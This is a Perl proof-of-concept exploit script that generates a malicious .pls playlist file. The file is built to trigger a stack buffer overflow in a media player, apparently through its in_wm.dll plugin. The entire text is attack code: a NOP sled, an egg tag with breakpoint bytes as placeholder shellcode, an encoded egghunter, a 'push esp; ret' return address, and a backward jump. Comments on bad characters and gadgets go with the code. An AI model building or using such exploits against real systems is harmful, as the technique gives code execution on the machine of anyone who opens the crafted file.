#!/usr/bin/perl -w

$start= "[playlist]\r\nFile1=\\\\";

# badchars for $nop & $shellcode: \x00\x0a\x0d\x2e\x5c
# Origin length of $nop ="\x90" x 856;

$shell = "B00BB00B" .
"\xCC" x 800;

$nop="\x90" x (856 - 800 - 8) . $shell;

# length 126 + 20 = 146 bytes
$egghunter = "\x90" x 20 .
"\x89\xe5\xda\xdc\xd9\x75\xf4\x5b\x53\x59\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51" .
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32" .
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" .
"\x42\x75\x4a\x49\x35\x36\x4b\x31\x58\x4a\x4b\x4f\x56\x6f" .
"\x51\x52\x51\x42\x31\x7a\x73\x32\x43\x68\x48\x4d\x76\x4e" .
"\x77\x4c\x54\x45\x50\x5a\x30\x74\x48\x6f\x48\x38\x57\x32" .
"\x36\x50\x70\x30\x33\x72\x6e\x6b\x69\x6a\x6c\x6f\x44\x35" .
"\x4b\x5a\x4c\x6f\x42\x55\x6a\x47\x59\x6f\x4d\x37\x41\x41";

$shellcode = "\xcc" x (166 - 146) . $egghunter;

# badchars for \x83 part: \x00 to \x7F
# 0x66606953 : push esp # ret [in_wm.dll]
# jump 148 bytes backward
# 0:  83 ec 4a                sub    esp, 0x4a
# 3:  83 ec 4a                sub    esp, 0x4a
# 6:  ff e4                   jmp    esp 

$jmp="\x53\x69\x60\x66"."\x83\xec\x4a\x83\xec\x4a\xff\xe4"."\x90\x90\x90\x90";
$end="\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n";
open (MYFILE, '>poc.pls');
print MYFILE $start;
print MYFILE $nop;
print MYFILE $shellcode;
print MYFILE $jmp;
print MYFILE $end;
close (MYFILE);
